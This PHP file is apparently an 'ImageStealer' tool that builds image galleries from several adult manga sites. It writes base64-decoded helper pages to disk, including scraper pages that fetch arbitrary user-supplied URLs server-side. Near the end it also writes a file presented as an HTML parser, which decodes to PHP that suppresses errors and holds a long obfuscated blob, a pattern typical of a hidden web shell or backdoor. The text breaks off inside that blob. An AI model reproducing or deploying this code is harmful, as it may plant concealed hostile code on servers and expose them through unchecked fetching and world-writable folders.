<?php
require 'inc/inc.php';
    print $ireng;
//sysinfo
$dir = mkdir("rootresult", 0777);
$self=$_SERVER['PHP_SELF'];
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}

//h2r

if(isset($_GET['h2'])){
    print $hentai2read;
}
    
if(isset($_GET['h2r'])){
    echo '[ <font color=gray>',$link,'</font> ] -> as victim',$pencetan; 
    
    for($i=1;$i<=$am0;$i++){
    $i = sprintf('%04d',$i);
    $jml++;
    
    echo $tag,$subd,$i,$fat,'>';
    
        }
        print "</div>Count: $jml";
    }

 //nhent   
if(isset($_GET['nhentai'])){
    print $nhentai;
}

if(isset($_GET['nhen'])){
    echo '[ <font color=gray>',$link,'</font> ] -> as victim',$pencetan; 

for($i=1;$i<=$am0;$i++){	
echo $tag,$nhent,$c0,'/',$i,$fat,'>';
$jml++;
    }
    print "</div>Count: $jml";
}

if(isset($_GET['hitomi'])){
echo'
<form action="index.php" method="get">
<input type="hidden" name="page" value="hitomi"/>
<font face="Consolas" size="6" color="gold">
-------------<br></font>
<font face="Consolas" size="6" color="red">Hitomi.La Stealer</font><p>
<font face="Consolas" size="4" color="gold">
gallery subdomain : <input type="text" style="width:8%;" placeholder="https://ba.hitomi.la" name="subd"><br>
code : <input type="text" style="width:4%;" placeholder="1142305" name="c0"><br>
amount : <input type="text" style="width:2%;" placeholder="24" name="am0"><br>
img extension : <input type="text" style="width:3%;" placeholder=".jpg" name="ext">
<br>
<font face="Consolas" size="6" color="gold">	
-------------<br></font>
<input type="submit" name="hitomila" value="LOCK">
<br>
</font>
<br>
</form>';	
}
if(isset($_GET['hitomila'])){
$subd = $_GET['subd'];
$c0 = $_GET['c0'];
$ext = $_GET['ext'];
$am0 = $_GET['am0'];
echo'<br><font face="Consolas" size="3" color="gray">images load no needed if u run this script on another server(localhost)</font><p>';
echo'<div id="menu"><a href="steal.php" rel="nofollow" target="_blank"><font face="Consolas" size="5" color="white"><b>STEAL<b/></font></a><p></div>';	
echo'<div class="memek"><br>';	
for($i=1;$i<=$am0;$i++){
echo" <img width='220' height='350' src=";
echo $subd;
echo "/galleries/";
echo $c0; echo'/';
echo $i; echo $ext;
echo ">";	
	}
}
echo "</div>";
if(isset($_GET['pururin'])){
echo'
<form action="index.php" method="get">
<input type="hidden" name="page" value="puru"/>
<font face="Consolas" size="6" color="gold">
<br>
-------------<br></font>
<font face="Consolas" size="6" color="red">Pururin.io Stealer</font><p>
<font face="Consolas" size="4" color="gold">
code : <input type="text" style="width:4%;" placeholder="38027" name="c0"><br>
amount : <input type="text" style="width:2%;" placeholder="24" name="am0"><br>
img extension : <input type="text" style="width:3%;" placeholder=".jpg" name="ext">
<br>
<font face="Consolas" size="6" color="gold">	
-------------<br></font>
<input type="submit" name="puru" value="LOCK">
<br>
</font>
<br>
</form>';
}
if(isset($_GET['puru'])){
$c0 = $_GET['c0'];
$ext = $_GET['ext'];
$am0 = $_GET['am0'];
echo'<div id="menu"><a href="steal.php" rel="nofollow" target="_blank"><font face="Consolas" size="5" color="white"><b>STEAL<b/></font></a><p></div>';	
echo'<div class="memek"><br>';	
for($i=1;$i<=$am0;$i++){
echo" <img width='220' height='350' src=";
echo "https://cdn.pururin.io/assets/images/data/";
echo $c0; echo'/';
echo $i; echo $ext;
echo ">";	
	}
}
echo '</div>';
if(isset($_GET['hentaifox'])){
echo'
<form action="index.php" method="get">
<input type="hidden" name="page" value="hentaifox"/>
<font face="Consolas" size="6" color="gold">
-------------<br></font>
<font face="Consolas" size="6" color="red">HentaiFox Stealer</font><p>
<font face="Consolas" size="4" color="gold">
   subdomain gallery : <input type="text" style="width:8%;" placeholder="https://i.hentaifox.com/" name="subd"><br>
folder : <input type="text" style="width:4%;" placeholder="002" name="f0"><br>
code : <input type="text" style="width:4%;" placeholder="864729" name="c0"><br>
amount : <input type="text" style="width:2%;" placeholder="38" name="am0"><br>
img extension : <input type="text" style="width:3%;" placeholder=".jpg" name="ext">
<br>
<font face="Consolas" size="6" color="gold">	
-------------<br></font>
<input type="submit" name="fox" value="LOCK">
<br>
</font>
<br>
</form>';
}
if(isset($_GET['fox'])){
$subd = $_GET['subd'];
$f0 = $_GET['f0'];
$c0 = $_GET['c0'];
$ext = $_GET['ext'];
$am0 = $_GET['am0'];
echo'<div id="menu"><a href="steal.php" rel="nofollow" target="_blank"><font face="Consolas" size="5" color="white"><b>STEAL<b/></font></a><p></div>';	
echo'<div class="memek"><br>';	
for($i=1;$i<=$am0;$i++){
echo" <img width='220' height='350' src=";
echo $subd; echo'/';
echo $f0; echo'/';
echo $c0; echo'/';
echo $i; echo $ext;
echo ">";	
	}
}
echo '</div>';
if(isset($_GET['hmanga'])){
echo'
<form action="index.php" method="get">
<input type="hidden" name="page" value="hmanga"/>
<font face="Consolas" size="6" color="gold">
-------------<br></font>
<font face="Consolas" size="6" color="red">HmangaS Stealer</font><p>
<font face="Consolas" size="3" color="gray">
<i>hmangasearcher always use long URLs, check ur input code correctly.</i>
<p>
<font face="Consolas" size="4" color="gold">
sub gallery : <input type="text" style="width:13%;" placeholder="http://h10.hmangasearcher.com" name="subd"><br>
folder : <input type="text" style="width:4%;" placeholder="101" name="f0"><br>
fullmangacode : <input type="text" style="width:18%;" placeholder="ex: Scarlet%20Desire%201/1" name="c0"><br>
amount : <input type="text" style="width:2%;" placeholder="190" name="am0"><br>
img ext : <input type="text" style="width:3%;" placeholder=".jpg" name="ext">
<br>
<font face="Consolas" size="6" color="gold">	
-------------<br></font>
<input type="submit" name="hmangas" value="LOCK">
<br>
</font>
<br>
</form>';
}
if(isset($_GET['hmangas'])){
$subd = $_GET['subd'];
$f0 = $_GET['f0'];
$c0 = $_GET['c0'];
$ext = $_GET['ext'];
$am0 = $_GET['am0'];
echo'<div id="menu"><a href="steal.php" rel="nofollow" target="_blank"><font face="Consolas" size="5" color="white"><b>STEAL<b/></font></a><p></div>';	
echo'<div class="memek"><br>';	
for($i=1;$i<=$am0;$i++){
echo" <img width='220' height='350' src=";
echo $subd; echo'/';
echo "manga/";
echo $f0; echo'/';
echo $c0; echo'/';
echo $i; echo $ext;
echo ">";
	}
}
echo '</div>';
$steal =
			'PHRpdGxlPkltYWdlU3RlYWxlcjwvdGl0bGU+DQo8bGluayByZWw9InNob3J0Y3V0IGljb24iIGhyZWY9Imh0dHBzOi8vMS5icC5ibG9nc3BvdC5jb20vLXE0V2hvRXdmUmxJL1hEQ251b2ZfVHNJL0FBQUFBQUFBSXNRL0h4QTZoZDJtSU9naU84S3ZlWGF4S3dmYWVjYXdXcENnd0NMY0JHQXMvczE2MDAva2Fuby5wbmciIHR5cGU9ImltYWdlL3gtaWNvbiI+DQo8bWV0YSBuYW1lPSdhdXRob3InIGNvbnRlbnQ9J1N0dXBpZGMwZGUgRmFtaWx5Jz4NCjxsaW5rIGhyZWY9Imh0dHA6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVVidW50dSIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyI+DQoNCjxzdHlsZT4NCg0KLnN1YmJ0biB7YmFja2dyb3VuZDojYjcwNTA1O2NvbG9yOndoaXRlO2JvcmRlcjogMXB4IHNvbGlkICMwMDA7IHBhZGRpbmc6NnB4IDZweCA2cHggNnB4O30NCg0KDQouYm9yZGVyZ2F5YXsNCgkJCWJhY2tncm91bmQ6YmxhY2s7DQoJCQljb2xvcjp3aGl0ZTsNCgkJCW1hcmdpbjowIDEwcHg7DQoJCQlmb250LWZhbWlseTpVYnVudHUgTW9ubzsNCgkJCWZvbnQtc2l6ZToxNnB4Ow0KCQkJYm9yZGVyOjJweCBzb2xpZCAjMmQyYjJiOw0KCQ0KCQl9DQoJCS5ib3JkZXJnYXlhOmhvdmVyew0KCQkJYmFja2dyb3VuZDojMmQyYjJiOw0KCQkJY29sb3I6d2hpdGU7DQoJCQltYXJnaW46MCAxMHB4Ow0KCQkJZm9udC1mYW1pbHk6VWJ1bnR1IE1vbm87DQoJCQlmb250LXNpemU6MTZweDsNCgkJCWJvcmRlcjoycHggc29saWQgY3JpbXNvbjsNCgkJfQ0KCQ0KCS5pbWFnZSB7DQogICAgd2lkdGg6IDM5MHB4Ow0KICAgIGhlaWdodDogMzQwcHg7DQogICAgLXdlYmtpdC1hbmltYXRpb246c3BpbiA4cyBsaW5lYXIgaW5maW5pdGU7DQogICAgLW1vei1hbmltYXRpb246c3BpbiA4cyBsaW5lYXIgaW5maW5pdGU7DQogICAgYW5pbWF0aW9uOnNwaW4gN3MgbGluZWFyIGluZmluaXRlOw0KfQ0KQC1tb3ota2V5ZnJhbWVzIHNwaW4geyAxMDAlIHsgLW1vei10cmFuc2Zvcm06IHJvdGF0ZSgtMzYwZGVnKTsgfSB9DQpALXdlYmtpdC1rZXlmcmFtZXMgc3BpbiB7IDEwMCUgeyAtd2Via2l0LXRyYW5zZm9ybTogcm90YXRlKC0zNjBkZWcpOyB9IH0NCkBrZXlmcmFtZXMgc3BpbiB7IDEwMCUgeyAtd2Via2l0LXRyYW5zZm9ybTogcm90YXRlKC0zNjBkZWcpOyB0cmFuc2Zvcm06cm90YXRlKC0zNjBkZWcpOyB9IH0NCg0KDQoNCjwvc3R5bGU+DQoNCjw/cGhwDQoJaW5jbHVkZSgnc2x1dC5waHAnKTsgLy9QYXJzZXIgdG8gZ2V0IGVsZW1lbnQgaW4geW91ciBsaW5rDQoJaWYoaXNzZXQoJF9QT1NUWydzdWJtaXQnXSkpewkNCgkJJHVybD1maWxlX2dldF9odG1sKCRfUE9TVFsndXJsJ10pOyANCgkkaW1hZ2UgPSAkdXJsLT5maW5kKCJpbWciKTsgDQoJZm9yZWFjaCgkaW1hZ2UgYXMgJGltZykgDQoJew0KCQkkcz0kaW1nLT5zcmM7IA0KCQkkaW1nX25hbWUgPSAncm9vdHJlc3VsdC8nLmJhc2VuYW1lKCRzKTsgLy9jaGFuZ2UgaXQNCgkJZmlsZV9wdXRfY29udGVudHMoJGltZ19uYW1lLCBmaWxlX2dldF9jb250ZW50cygkcykpOyANCgl9DQoJfQ0KCQ0KCQ0KPz4NCiAgPGJyPjxjZW50ZXI+PGZvbnQgZmFjZT0iVWJ1bnR1IiBzaXplPSI1IiBjb2xvcj0id2hpdGUiPjxiPkltYWdlU3RlYWxlciBieSBTYzA8Yi8+PC9mb250PjwvY2VudGVyPg0KICA8Y2VudGVyPjxpbWcgY2xhc3M9J2ltYWdlJyBzcmM9J2h0dHBzOi8vMy5icC5ibG9nc3BvdC5jb20vLTZYWk9rNnVQVjRVL1hFQk84eHdGY3dJL0FBQUFBQUFBQkw0L0JEQUhBeElvT0NBWkNPMEZtRW5OdEF5R1hvVHg5ZHo2d0NMY0JHQXMvczE2MDAvd2VlYmxvZ28ucG5nJz4NCiAgPGJyPjxicj48YnI+DQogIDxjZW50ZXI+PGZvbnQgZmFjZT0iVWJ1bnR1IiBzaXplPSIzIiBjb2xvcj0id2hpdGUiPjxiPmJsYW5rPyBvciBzdG9wcGVkIHJlc3BvbmQsIGRvbid0IHdvcnJ5IHN0aWxsIGRvIHdlYnJlcXVlc3QuPGIvPjwvZm9udD4NCiAgPHA+DQo8Y2VudGVyPg0KPGJvZHkgYmdjb2xvcj1ibGFjaz4NCjxmb3JtIGlkPSJmb3JtMSIgbmFtZT0iZm9ybTEiIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPg0KICA8dGFibGUgd2lkdGg9IjUwMCIgIGFsaWduPSJjZW50ZXIiIGNlbGxwYWRkaW5nPSIxIiBjZWxsc3BhY2luZz0iMSI+DQogICAgPHRyPg0KICAgICAgPHRkIGNvbHNwYW49IjIiPjxsYWJlbCBmb3I9InRleHRmaWVsZCI+PC9sYWJlbD4NCiAgICAgIDxpbnB1dCBjbGFzcz0iYm9yZGVyZ2F5YSIgc3R5bGU9IndpZHRoOjEwMCU7IiBwbGFjZWhvbGRlcj0iUFVUIFlPVVIgRlVMTCBVUkwgSEVSRS4uLi4iIHR5cGU9InRleHQiIG5hbWU9InVybCIgaWQ9InRleHRmaWVsZCIgLz4NCiAgICAgIDwvdGQ+DQogICAgICANCiAgICA8L3RyPg0KICAgIDx0cj4NCiAgICAgIDx0ZCBjb2xzcGFuPSIyIiBhbGlnbj0iY2VudGVyIiB2YWxpZ249Im1pZGRsZSI+PGlucHV0IGNsYXNzPSJzdWJidG4iIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiBpZD0iYnV0dG9uIiB2YWx1ZT0iICA+ICAiIC8+PC90ZD4NCiAgICA8L3RyPg0KICA8L3RhYmxlPg0KPC9mb3JtPg==
			';
			$file = fopen("steal.php","w+");
			$write = fwrite ($file ,base64_decode($steal));	
		
$dnesia =
			'PHRpdGxlPkltYWdlU3RlYWxlcjwvdGl0bGU+DQo8bGluayByZWw9InNob3J0Y3V0IGljb24iIGhyZWY9Imh0dHBzOi8vMS5icC5ibG9nc3BvdC5jb20vLXE0V2hvRXdmUmxJL1hEQ251b2ZfVHNJL0FBQUFBQUFBSXNRL0h4QTZoZDJtSU9naU84S3ZlWGF4S3dmYWVjYXdXcENnd0NMY0JHQXMvczE2MDAva2Fuby5wbmciIHR5cGU9ImltYWdlL3gtaWNvbiI+DQo8bWV0YSBuYW1lPSdhdXRob3InIGNvbnRlbnQ9J1N0dXBpZGMwZGUgRmFtaWx5Jz4NCjxsaW5rIGhyZWY9Imh0dHA6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVVidW50dSIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyI+DQoNCjxzdHlsZT4NCg0KLnN1YmJ0biB7YmFja2dyb3VuZDojYjcwNTA1O2NvbG9yOndoaXRlO2JvcmRlcjogMXB4IHNvbGlkICMwMDA7IHBhZGRpbmc6NnB4IDZweCA2cHggNnB4O30NCg0KDQouYm9yZGVyZ2F5YXsNCgkJCWJhY2tncm91bmQ6YmxhY2s7DQoJCQljb2xvcjp3aGl0ZTsNCgkJCW1hcmdpbjowIDEwcHg7DQoJCQlmb250LWZhbWlseTpVYnVudHUgTW9ubzsNCgkJCWZvbnQtc2l6ZToxNnB4Ow0KCQkJYm9yZGVyOjJweCBzb2xpZCAjMmQyYjJiOw0KCQ0KCQl9DQoJCS5ib3JkZXJnYXlhOmhvdmVyew0KCQkJYmFja2dyb3VuZDojMmQyYjJiOw0KCQkJY29sb3I6d2hpdGU7DQoJCQltYXJnaW46MCAxMHB4Ow0KCQkJZm9udC1mYW1pbHk6VWJ1bnR1IE1vbm87DQoJCQlmb250LXNpemU6MTZweDsNCgkJCWJvcmRlcjoycHggc29saWQgY3JpbXNvbjsNCgkJfQ0KCQ0KCS5pbWFnZSB7DQogICAgd2lkdGg6IDM5MHB4Ow0KICAgIGhlaWdodDogMzQwcHg7DQogICAgLXdlYmtpdC1hbmltYXRpb246c3BpbiA4cyBsaW5lYXIgaW5maW5pdGU7DQogICAgLW1vei1hbmltYXRpb246c3BpbiA4cyBsaW5lYXIgaW5maW5pdGU7DQogICAgYW5pbWF0aW9uOnNwaW4gN3MgbGluZWFyIGluZmluaXRlOw0KfQ0KQC1tb3ota2V5ZnJhbWVzIHNwaW4geyAxMDAlIHsgLW1vei10cmFuc2Zvcm06IHJvdGF0ZSgtMzYwZGVnKTsgfSB9DQpALXdlYmtpdC1rZXlmcmFtZXMgc3BpbiB7IDEwMCUgeyAtd2Via2l0LXRyYW5zZm9ybTogcm90YXRlKC0zNjBkZWcpOyB9IH0NCkBrZXlmcmFtZXMgc3BpbiB7IDEwMCUgeyAtd2Via2l0LXRyYW5zZm9ybTogcm90YXRlKC0zNjBkZWcpOyB0cmFuc2Zvcm06cm90YXRlKC0zNjBkZWcpOyB9IH0NCg0KDQoNCjwvc3R5bGU+DQoNCjw/cGhwDQoJaW5jbHVkZSgnc2x1dC5waHAnKTsgLy9QYXJzZXIgdG8gZ2V0IGVsZW1lbnQgaW4geW91ciBsaW5rDQoJaWYoaXNzZXQoJF9QT1NUWydzdWJtaXQnXSkpewkNCgkJJHVybD1maWxlX2dldF9odG1sKCRfUE9TVFsndXJsJ10pOyANCgkkaW1hZ2UgPSAkdXJsLT5maW5kKCJpbWciKTsgDQoJZm9yZWFjaCgkaW1hZ2UgYXMgJGltZykgDQoJew0KCQkkcz0kaW1nLT5zcmM7IA0KCQkkaW1nX25hbWUgPSAncm9vdHJlc3VsdC8nLmJhc2VuYW1lKCRzKTsgLy9jaGFuZ2UgaXQNCgkJZmlsZV9wdXRfY29udGVudHMoJGltZ19uYW1lLCBmaWxlX2dldF9jb250ZW50cygkcykpOyANCgl9DQoJfQ0KCQ0KCQ0KPz4NCiAgPGJyPjxjZW50ZXI+PGZvbnQgZmFjZT0iVWJ1bnR1IiBzaXplPSI1IiBjb2xvcj0id2hpdGUiPjxiPkltYWdlU3RlYWxlciBieSBTYzA8Yi8+PC9mb250PjwvY2VudGVyPg0KICA8Y2VudGVyPjxpbWcgY2xhc3M9J2ltYWdlJyBzcmM9J2h0dHBzOi8vMy5icC5ibG9nc3BvdC5jb20vLTZYWk9rNnVQVjRVL1hFQk84eHdGY3dJL0FBQUFBQUFBQkw0L0JEQUhBeElvT0NBWkNPMEZtRW5OdEF5R1hvVHg5ZHo2d0NMY0JHQXMvczE2MDAvd2VlYmxvZ28ucG5nJz4NCiAgPGJyPjxicj48YnI+DQogIDxjZW50ZXI+PGZvbnQgZmFjZT0iVWJ1bnR1IiBzaXplPSIzIiBjb2xvcj0id2hpdGUiPjxiPmJsYW5rPyBvciBzdG9wcGVkIHJlc3BvbmQsIGRvbid0IHdvcnJ5IHN0aWxsIGRvIHdlYnJlcXVlc3QuPGIvPjwvZm9udD4NCiAgPHA+DQo8Y2VudGVyPg0KPGJvZHkgYmdjb2xvcj1ibGFjaz4NCjxmb3JtIGlkPSJmb3JtMSIgbmFtZT0iZm9ybTEiIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPg0KICA8dGFibGUgd2lkdGg9IjUwMCIgIGFsaWduPSJjZW50ZXIiIGNlbGxwYWRkaW5nPSIxIiBjZWxsc3BhY2luZz0iMSI+DQogICAgPHRyPg0KICAgICAgPHRkIGNvbHNwYW49IjIiPjxsYWJlbCBmb3I9InRleHRmaWVsZCI+PC9sYWJlbD4NCiAgICAgIDxpbnB1dCBjbGFzcz0iYm9yZGVyZ2F5YSIgc3R5bGU9IndpZHRoOjEwMCU7IiBwbGFjZWhvbGRlcj0iUFVUIFlPVVIgRlVMTCBVUkwgSEVSRS4uLi4iIHR5cGU9InRleHQiIG5hbWU9InVybCIgaWQ9InRleHRmaWVsZCIgLz4NCiAgICAgIDwvdGQ+DQogICAgICANCiAgICA8L3RyPg0KICAgIDx0cj4NCiAgICAgIDx0ZCBjb2xzcGFuPSIyIiBhbGlnbj0iY2VudGVyIiB2YWxpZ249Im1pZGRsZSI+PGlucHV0IGNsYXNzPSJzdWJidG4iIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiBpZD0iYnV0dG9uIiB2YWx1ZT0iICA+ICAiIC8+PC90ZD4NCiAgICA8L3RyPg0KICA8L3RhYmxlPg0KPC9mb3JtPg==
			';
			$file = fopen("dnesia.php","w+");
			$write = fwrite ($file ,base64_decode($dnesia));			
$slut =
			'PD9waHAgDQojIHBlbmphZ2FiaXN1QG91dGxvb2suY29tDQpAaW5pX3NldCgnb3V0cHV0X2J1ZmZlcmluZycsMCk7DQpAaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAwKTsNCiRwYXNpcm1lcmFoID0gIjdUMTRadHRUa3A4M1NQa1BrSlo0a0JaV1ZzN3VYcFVsUlNmbGVhWHVycHhSeWFaaEl6SXNnQXVBdG1nUU9CSkVBbkQvOSt2dW1RSG1DVVVQeC9zNFNka2lNVE05UFQwOVBkMDkzWU9iVWtkeGNod0ZOM0xGYzdjc202MnlhTlh0QmI5KytWSUFuODR5WGdlaklHL3ZnclJjejZFT2xzL2c2Wkdva0NlM0tkUzRBVURVSG45cWUxUmE4OEc0aXZOeXQ4aXJkN1pWVERLanFteVM1RXJkc082MmlLT01Va3dhOWpuSVhqL0lrZ1dUZ0JLV0xaS0k0TUdUajE5KzhlVVgrL3NCTkF3UW53Q3h2SW1UYUpCelZobmRmdm5GalJ3WFBIV0cxWUZmQUwrSzM3R2t5RVkyb2k2MkgzZ3pHaE5GTzU3THhXM2VJSm9sakNrWWJ5SHZDUXU2blNoZU1nQ2RydUpxc3p6TEVrOFNIaXdabTQ4T0dua3JsaThCWFJ4Z3d1WXN6N29oUGc5U1NJa1JLMGt4cnp3azBJTmtsdCtLc3ZJbTZEWWRCYytlQlZLOGlMS3VxSWdQZStPbXl4cGMyQTJQbWxSQWE1WVhLN1ZJa0tkTzUyRTA3cnp0TmZYcTVydVhuYnZwZFR6WjNaVW9hTzZHNFdFL1E2SHlqbTN5MFZSeU5MdVRkZmNJVnV2b0hmOUNxZnRQNmRxa1pLRVNTeEI1NzdCMHNFbk5TTWlsVG1ySjVna3I4b3d0ZThyMDFSd010ZitSMW8yeGNYekRrK3NIVlBlNWxnOEgxeXdnbkhBcUdEemw1OHN2aWlwQ1JoUDVHZllteHpoZlhFcHlFUkN2Y2twbUJ1UDl5L2QwUDgvTy8vdnJpOW41eFgrZEgrbjFZS2xPbFRCdzc3UFFLS0p5TWdyNGZQYU13bTlJU2N1RVV0NEtuTTE5cGZNYzJuTTRHWXVxTXNwemFhdWtmQXZUWGtJZ1lpTkpsK1NER1dVYXpOcWlBUEVBRlRXaDBNbEpjam9ZOC9hZGM4YWJUQ2Q4TDZkTGpHaWJVbnBvQS9Wckw2NGVDcEJ3Vm8yNHEyd1d2eVorMXB0WXZ1SkQ0bExHRXB3VEd4SXdGZllSQll0c3NIUHJPTGtDMmNHQ0xBN21xL21mZ3FKWmlsS1ZKd0R3aGdHTkM1Z0VSQTFOM1EySFVBTWhnYkNYUzhvRUtYSmxhZDJscnRsSWR0VHdqa1ZPeU05dGxMUWxiajl1S2pZa0RXSXM3aHA3a0RZS1JxSnYzNnBEYUVTV3p3TDB0MitCR0ZGOEkwbXoxanN2ZVp0UFhxT2xqNW9LN2g1eFpMZEdMdCtQQm9kTlNyUXQ0dk1SbGVnOXk1WlViZjB5V2t6V05lcGNJcFIyendlQ0Z4OU1jTlNuelZhK216SldNejRLendpcHhveDNaNjNSaVhwZVZJZTJiUSttQnc5UUV3UjNPNVpMd1lja2VkT0k1c2lOZVJ1MnZPSGc4RzVWVkNBWllCY0FaQW5ib2tDN1REczE2a3Q2SnFyWnlIaDhDb3lFL2ZZY1ZkRENCVGFBMVcyZ1BxSVJ3RkI2OEJ5YVR3U2x4YnNWS1NrSTYwdTBCbjJPR3U2TVV4NEFnazVvSFhwaUQ1OGEvTTBmamxRY3RHSWtybExxNFdxdllGWFkyekplcE9ZTW1DSUNxdjNyUTM4d0lNZ0hRbGxxcVFlS2ZhQ01JcGFRbW5JUW13cjRoblpGVFpON3MxalNobjQ2L2VFTS9qdTlhM0xMUHJ0WG15QkllS050Y3NNajdTSUJuUUhNQUVQVnlwVDUyOVpORGMweHdFN2R6SGJKcU5zdzJoS1JNVmJVYXdqS1dlVFNKdFFaZ2IrYkNVSWdBb1FSWjkrVjJTb0F2YkYweklIU2pZZmJvUkd3YlpqRVpCYWFjVVZ6UTZNQzRBTHEwdTB0WjQrR3htaGUzRGx1RTVseWpSMnhvR2VhT0EwVlN2TitvSlQxWjN4Tk9lRHNtL05hTE1XcmZDYVdJbFlXTFlHVzEreTJqR01XTFg1RysrQlhzUVAydHhjLy9tYzZuUTdHNi95T0xlYjJuSWxoK0lMRmRyM25vdlJqOHhaWWxFZ3BSdm52WHN0enU2WHowVDFMK0YrbmRXempIK2pGNmZmVFhpMkM3YktkMFlHSENPSHhmamg1U2RRd0hJY1BYZGJ6S2xRdXFLZW5Yc3UvZ1NoYVRvNFVxMENkRXpSTGUrYmNvZlY2MkxBdkg3Y2VUYUIvYXZienp4ZW5XZ2VhOEdqVS8rYjBmMEhQL3ZQVVhmK2pRVDJ3R3JGb2dXbFlQWHY5SUZtTHBKeURRQVRSMkhtZkdxRFcxdGxJeFZ5TlA4RlRzdDBlZ244TWFXMi9ybm1PMHVXTkx2K05PdWpqS1JNRzdFMndZV3U4WnZuZDkyTE8zMXlHTUg1bkswNGxRcU82eldjNjl0UmhYekRYQ3pRTnBCbUsrNS9jL293aFYwNm9qaEQzTG5YU0J5MTZ2UWFGcHg4c29yc29maGQ5WG9YaVN4VWZtcDRKcFlOUXJZM0JKNDNybEYyaDh6U3ZyUFdLNnFFR1QwTWl2U3ZuTUpKby9KWXRBNFJHWG9OajFhdlJmZzVBaFU4Y2ZQZ1FpSjgzT1lob2g3QlQ3MjhaTFpqVmNNdVc4ZnJyTjk5ZFdVN25uT3BKSTFRMGlnUG9aY0VJeDVjdzllK1NmQTVHdUcvRkhXQ2Vzb29WR1Z2V25oUUg3dVNMZGRsTGdHdFR0NjVhQ3o5Y1Zicm05eisrT1R2bmc3QnpvS1phTGF1bzh1ejdzMksrL2V2Rnk2RHp0MUtjb1hRdzNBMlBnbmlZNEx1ajdTQzgvdW4wVkIzQ0pOd0FiOGxoOGxLVnFYcFptWXFmaisza0dyWkM0K0ZuR0k3Q0RaVmVXWWNjaHlGQmsvaGhvS0tnOGRFbnFWenJ6eTlHZ3FGMGgrZVlUbVN6ZjZ1QzU2WUVlZ0pyRGVWVEdseGZCUVZ0Zm9uNTRzVHlwRkhvc1JhRmZUSVloVktweWx0TUlYckdBb1pMeW5PeW9JSFJNMmtmdzlORVVPcnBHNC91dHFWQllxREZaUVpHcUR1RE5TSEp4d3B2eGhnZ0RUSkJZRjBWbzRNak1HMkY1VzJFVDZhdytKNGpUYkczRmJNUWhaVytFVW9KY01jcmtMbmEyMmJBTUlUUGloOTlkaWFHRFhVMFByVGJBajFKYkxRRWNCMjI1QUpueWh4WjlXMGNmUkJWMEh1eFZkTHlMZHV4MUZ5Z1NGSzBxbzQ1SlloSnRwUkoyTnBhQ0FHUEMzOGFRV1p2NWhNNEhXZnBhYUVTYWxpZTZDc0dyTDdncGN1OHVET0ZZd05pTUVFWnUwYm5zVWJBZDY2bTlqNHVQeTVXSXFaUTJlT1YyaDVHYm9zeHE4elM4RGtPeURSZ2QxbjBkNERUYnFzRTBwWldHaWRNZ0ZxYnAycjRXZTNjMlBHcHdEbkg5VGlWQmVvN0UrVm9tc01SeC9RWjloQnFBWEtyZ1pCZ0FXTW00V0IzUGpNVVJ1U1ZSZlFjNmc2QS91NXF0QzlYWWpkdGw0UXZXU3hpcXRnTDlnTERJeVVBYU5XNXFWM2RKNEg2QUV2UzQyUlN6cU1sYUFzckxVOWFjRXlpdUJYa255ZXdmYUFtME1odW5Vcjd3VFBpUkpWbXFqSlN3WUthTzJGNGZVVmk0SC8ySGtlTVFSVGpQUFNRekJLSVZ0cjM4eHpVUXBDWDdMM3BCc2xpeVp3RUNQaVhWYnR6Vmt4bjhVVFBiK0RhaFd0ajVGd0J0WEpKSDBmd00zamZUK2dJNzg3emtOUTIvcXRHa0pMcGxSakNaTXMzbHhFaDZxdFhPQU05THhHbXd4ZmhTMWpxaDdPRXA0SlFjeGlQUGdiNllndWN0a3M3akVsZGFvZXQ1NWxtQXlEelh4R1JjeG13NVlHeEJ5UFEwZWpBbnNqNnVNMW85Q1Evd3Y4cnhaWDB3THBkRXJ4SGJkR2Nld2VPWStBbXVZS1E3TWFKa2s1dkFybW5OREprODBUN0JqV1haZVRkYy9jT2JqOHNqeEUrN1lhbFdrODZUbVJYdDlMY25BQzlGR2daUi9LdHpkdExDRURMSFM5R2t3Q01wQnRGQk5Yb1dFR0VWL2cyRTAwTnBZL3pGZFBJb0xxbFk0QjlpbEhYdlVycWE3aWpLci9kR1RVaE9zMHpIQ3NNa1NqRExiV2pqOTQrZ0J5T1BvaW9UM3o1VW93VWtDM1NVZkJxRStsbWlTQmtyYW5vZXFVMjFKdlB6bENBK2lsQTV1VUdHdEJmcUJqSUx6V1ZIZXVOZWRPR2ZkYzUyWXg4UXVIN2k0VzVnd0tONHJrR2c2M0VnQmFLTi9Ib1BhSktRRUpvV3RHbUZrVTc2WlR5V1paSFFBRE5DckRyaGs3WXQvSGtPbGI3cHJCcytHcXU4WGUwSnhpOVNWaHA4eVp1MEtaS3k0b3QrS1BtZ0Y3YnVsNVJOU01hRG5ieHg2dWJkVWNCSlNKd1ZzVHBjTVJhMUg1TXFPcHB4b0twL2RJZXVOUzVPRlhjKzFJdlFaZDR1TE1Ga0oxYVFINTJBekpDMk8yTUQzdHEvNWZkSWYwbW83OWJFeURjRDN2RDNmM2RtaExPWVRwYmF0UFdXSFJHTjgrZDNRakdJRlZneFlJWUFIVmhEclV4c25QYXdkdnVaTWlXUUozU2liZkN2d0tDeXVWNnJPaG1Pc3hyb0ovcFR4V0k0REg3YXE5ZnE2YndPbDZXTnlXQ1FlSTEvSXF6T0s0VWJDWEhBQXQyYXI5N09XdzNhemxzUG4zZTY1NjhuUHllZmtMM2JSOG1VUG0xYW9JbGwvOSswdDA1RVkvZ1R2ZGw1L2t2bmVuSnFHbzUyUTJuSjkzaDh4UHh0V295bVUrank4bCtQNERLKzNLNnEwT29vZWdzVkNPbm5nc1k1dG9lOWpDazBFdDN3R0JuWDcrNitHVDIrdUo4YWZicSs0dEtta1pTOWVRNG